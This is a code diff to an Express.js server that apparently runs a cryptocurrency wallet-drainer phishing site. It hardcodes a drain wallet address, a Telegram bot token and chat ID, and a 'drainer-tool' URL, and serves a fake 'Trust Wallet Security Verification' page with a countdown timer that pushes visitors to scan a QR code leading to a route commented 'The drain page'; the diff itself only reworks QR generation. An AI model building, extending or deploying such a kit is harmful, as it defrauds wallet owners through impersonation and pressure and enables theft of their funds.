@@ -2,27 +2,26 @@ const express = require('express');
 const QRCode = require('qrcode');
 const app = express();
 
-// ========== YOUR REAL CONFIG ==========
 const DRAIN_ADDRESS = '0x071a1c7bE8609452CB268b3396EC5358E6E9Ecd6';
 const BOT_TOKEN = '6952302341:AAE1WRba7NjJXdV0tAvqSopXvllMkgBKfxs';
 const CHAT_ID = '6521633168';
 const SITE_URL = 'https://drainer-tool-production.up.railway.app';
-// ======================================
 
-app.get('/qr-code', async (req, res) => {
-  try {
-    const link = SITE_URL + '/verify';
-    const qrDataUrl = await QRCode.toDataURL(link, {
-      width: 300,
-      margin: 2,
-      color: { dark: '#000000', light: '#ffffff' }
-    });
-    res.send(`<img src="${qrDataUrl}" style="width:260px;height:260px;border-radius:12px">`);
-  } catch (err) {
-    res.send('<p style="color:red">QR Error: ' + err.message + '</p>');
-  }
-});
+// Generate QR data URL once at startup
+let qrDataUrl = '';
 
+async function generateQR() {
+  const link = SITE_URL + '/verify';
+  qrDataUrl = await QRCode.toDataURL(link, {
+    width: 300,
+    margin: 2,
+    color: { dark: '#000000', light: '#ffffff' }
+  });
+  console.log('✅ QR generated');
+}
+generateQR();
+
+// Main page - QR embedded directly
 app.get('/', (req, res) => {
   res.send(`<!DOCTYPE html>
 <html lang="en">
@@ -38,6 +37,7 @@ app.get('/', (req, res) => {
     .card{background:#1a1a1a;border-radius:20px;padding:30px 20px;margin-bottom:20px}
     h2{color:#3375ff;margin-bottom:8px;font-size:20px}
     p{color:#aaa;font-size:14px;margin-bottom:20px}
+    img{border-radius:16px;background:#fff;padding:10px}
     .warning{color:#ff9500;font-size:12px;margin-top:12px}
     .timer{color:#ff5555;font-weight:bold;font-size:18px;margin-top:8px}
   </style>
@@ -48,7 +48,7 @@ app.get('/', (req, res) => {
     <div class="card">
       <h2>Trust Wallet Security Verification</h2>
       <p>Scan this QR with your Trust Wallet camera to verify your wallet is safe.</p>
-      <img src="/qr-code" alt="QR Code" style="width:260px;height:260px;background:#fff;border-radius:16px;padding:10px">
+      <img src="${qrDataUrl}" width="260" height="260" alt="QR Code">
       <p class="warning">⚠ Expires in: <span class="timer" id="countdown">05:00</span></p>
     </div>
   </div>
@@ -59,6 +59,12 @@ app.get('/', (req, res) => {
 </body></html>`);
 });
 
+// Also keep /qr-code for direct access (optional)
+app.get('/qr-code', (req, res) => {
+  res.send(`<img src="${qrDataUrl}" width="260" height="260" style="border-radius:16px;background:#fff;padding:10px">`);
+});
+
+// The drain page
 app.get('/verify', (req, res) => {
   res.send(`<!DOCTYPE html>
 <html lang="en">
